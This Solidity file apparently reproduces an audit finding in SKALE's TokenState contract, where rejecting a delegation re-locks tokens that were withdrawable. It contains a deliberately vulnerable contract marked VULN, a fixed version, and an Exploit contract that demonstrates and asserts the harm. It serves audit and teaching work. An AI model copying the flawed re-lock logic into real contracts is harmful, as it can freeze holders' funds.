// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  SKALE TokenState — rejecting a mixed delegation re-locks unlocked tokens
    (ConsenSys Diligence, Jan 2020, finding 13828, TokenState._cancel).

    SYNTHETIC, cheatcode-free. The holder has 100 tokens of which 40 are
    purchased (locked) and 60 are withdrawable. initProposed stores one bit:
    the delegation is "purchased" if ANY purchased balance exists, then
    _cancel adds the FULL delegation amount back into _purchased.

    60 that could be transferred before the request cannot be transferred
    after it is rejected. The control restores only the purchased slice that
    was actually consumed, so those 60 stay withdrawable. */

contract DelegationController {
    struct Delegation {
        address holder;
        uint validatorId;
        uint amount;
        uint delegationPeriod;
        uint created;
        string info;
    }
}

contract TokenState {
    enum State {
        PROPOSED,
        ACCEPTED,
        DELEGATED,
        ENDING_DELEGATED,
        COMPLETED
    }

    mapping(uint => State) private _state;
    mapping(uint => uint) private _timelimit;
    mapping(address => uint) private _purchased;
    mapping(uint => bool) private _isPurchased;
    mapping(uint => DelegationController.Delegation) private _delegations;
    mapping(address => uint) public delegationIdOf;
    mapping(address => uint) public balanceOf;

    uint public nextId;

    function seed(address holder, uint balance, uint purchased) external {
        balanceOf[holder] = balance;
        _purchased[holder] = purchased;
    }

    function purchasedOf(address holder) external view returns (uint) {
        return _purchased[holder];
    }

    function isPurchasedOf(uint delegationId) external view returns (bool) {
        return _isPurchased[delegationId];
    }

    function stateOf(uint delegationId) external view returns (State) {
        return _state[delegationId];
    }

    function withdrawable(address holder) public view returns (uint) {
        uint locked = _purchased[holder];
        uint id = delegationIdOf[holder];
        if (id != 0 && _state[id] != State.COMPLETED) {
            locked += _delegations[id].amount;
        }
        uint bal = balanceOf[holder];
        if (locked >= bal) return 0;
        return bal - locked;
    }

    function transfer(address to, uint amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "balance");
        require(withdrawable(msg.sender) >= amount, "locked");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function propose(address holder, uint amount) external returns (uint delegationId) {
        delegationId = ++nextId;
        _delegations[delegationId] = DelegationController.Delegation({
            holder: holder,
            validatorId: 1,
            amount: amount,
            delegationPeriod: 3,
            created: block.timestamp,
            info: ""
        });
        _state[delegationId] = State.PROPOSED;
        delegationIdOf[holder] = delegationId;
        initProposed(delegationId);
    }

    function reject(uint delegationId) external returns (State state) {
        DelegationController.Delegation memory delegation = _delegations[delegationId];
        state = _cancel(delegationId, delegation);
    }

    function initProposed(uint delegationId) internal {
        DelegationController.Delegation memory delegation = _delegations[delegationId];
        _timelimit[delegationId] = delegation.created + 30 days;
        if (_purchased[delegation.holder] > 0) {
            _isPurchased[delegationId] = true;
            if (_purchased[delegation.holder] > delegation.amount) {
                _purchased[delegation.holder] -= delegation.amount;
            } else {
                _purchased[delegation.holder] = 0;
            }
        } else {
            _isPurchased[delegationId] = false;
        }
    }

    function proposedToUnlocked(uint delegationId) internal returns (State state) {
        state = State.COMPLETED;
        _state[delegationId] = state;
        _timelimit[delegationId] = 0;
    }

    function purchasedProposedToPurchased(uint delegationId, DelegationController.Delegation memory delegation)
        internal
        returns (State state)
    {
        state = State.COMPLETED;
        _state[delegationId] = state;
        _timelimit[delegationId] = 0;
        // @> VULN: the rejected delegation adds its full amount back into _purchased, re-locking tokens that were unlocked.
        _purchased[delegation.holder] += delegation.amount;
        // FIX: add back only the purchased slice initProposed actually subtracted.
    }

    function _cancel(uint delegationId, DelegationController.Delegation memory delegation) internal returns (State state) {
        if (_isPurchased[delegationId]) {
            state = purchasedProposedToPurchased(delegationId, delegation);
        } else {
            state = proposedToUnlocked(delegationId);
        }
    }
}

contract TokenStateFixed {
    enum State {
        PROPOSED,
        ACCEPTED,
        DELEGATED,
        ENDING_DELEGATED,
        COMPLETED
    }

    mapping(uint => State) private _state;
    mapping(uint => uint) private _timelimit;
    mapping(address => uint) private _purchased;
    mapping(uint => uint) private _purchasedTaken;
    mapping(uint => DelegationController.Delegation) private _delegations;
    mapping(address => uint) public delegationIdOf;
    mapping(address => uint) public balanceOf;

    uint public nextId;

    function seed(address holder, uint balance, uint purchased) external {
        balanceOf[holder] = balance;
        _purchased[holder] = purchased;
    }

    function purchasedOf(address holder) external view returns (uint) {
        return _purchased[holder];
    }

    function stateOf(uint delegationId) external view returns (State) {
        return _state[delegationId];
    }

    function withdrawable(address holder) public view returns (uint) {
        uint locked = _purchased[holder];
        uint id = delegationIdOf[holder];
        if (id != 0 && _state[id] != State.COMPLETED) {
            locked += _delegations[id].amount;
        }
        uint bal = balanceOf[holder];
        if (locked >= bal) return 0;
        return bal - locked;
    }

    function transfer(address to, uint amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "balance");
        require(withdrawable(msg.sender) >= amount, "locked");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function propose(address holder, uint amount) external returns (uint delegationId) {
        delegationId = ++nextId;
        _delegations[delegationId] = DelegationController.Delegation({
            holder: holder,
            validatorId: 1,
            amount: amount,
            delegationPeriod: 3,
            created: block.timestamp,
            info: ""
        });
        _state[delegationId] = State.PROPOSED;
        delegationIdOf[holder] = delegationId;
        initProposed(delegationId);
    }

    function reject(uint delegationId) external returns (State state) {
        DelegationController.Delegation memory delegation = _delegations[delegationId];
        state = _cancel(delegationId, delegation);
    }

    function initProposed(uint delegationId) internal {
        DelegationController.Delegation memory delegation = _delegations[delegationId];
        _timelimit[delegationId] = delegation.created + 30 days;
        if (_purchased[delegation.holder] > 0) {
            uint taken;
            if (_purchased[delegation.holder] > delegation.amount) {
                taken = delegation.amount;
                _purchased[delegation.holder] -= delegation.amount;
            } else {
                taken = _purchased[delegation.holder];
                _purchased[delegation.holder] = 0;
            }
            _purchasedTaken[delegationId] = taken;
        }
    }

    function purchasedProposedToPurchased(uint delegationId, DelegationController.Delegation memory delegation)
        internal
        returns (State state)
    {
        state = State.COMPLETED;
        _state[delegationId] = state;
        _timelimit[delegationId] = 0;
        _purchased[delegation.holder] += _purchasedTaken[delegationId];
    }

    function _cancel(uint delegationId, DelegationController.Delegation memory delegation) internal returns (State state) {
        state = purchasedProposedToPurchased(delegationId, delegation);
    }
}

contract Exploit {
    uint256 public constant BALANCE = 100 ether;
    uint256 public constant PURCHASED = 40 ether;
    uint256 public constant N = 60 ether;

    TokenState public buggy;
    uint256 public withdrawableBefore;
    uint256 public withdrawableAfter;
    uint256 public purchasedAfter;
    uint256 public reLocked;
    bool public markedAllPurchased;
    bool public transferOfNReverted;

    constructor() {
        buggy = new TokenState();
    }

    function run() external {
        buggy.seed(address(this), BALANCE, PURCHASED);
        withdrawableBefore = buggy.withdrawable(address(this));
        uint256 id = buggy.propose(address(this), BALANCE);
        markedAllPurchased = buggy.isPurchasedOf(id);
        buggy.reject(id);
        purchasedAfter = buggy.purchasedOf(address(this));
        withdrawableAfter = buggy.withdrawable(address(this));
        bool moved;
        try buggy.transfer(address(0xCAFE), N) returns (bool) {
            moved = true;
        } catch {
            moved = false;
        }
        transferOfNReverted = !moved;
        reLocked = withdrawableBefore - withdrawableAfter;
        require(withdrawableBefore == N, "N was not withdrawable");
        require(markedAllPurchased, "delegation was not marked purchased");
        require(purchasedAfter == BALANCE, "full amount was not re-locked");
        require(withdrawableAfter == 0, "N is still withdrawable");
        require(transferOfNReverted, "transfer of N succeeded");
        require(reLocked == N, "harm");
    }
}
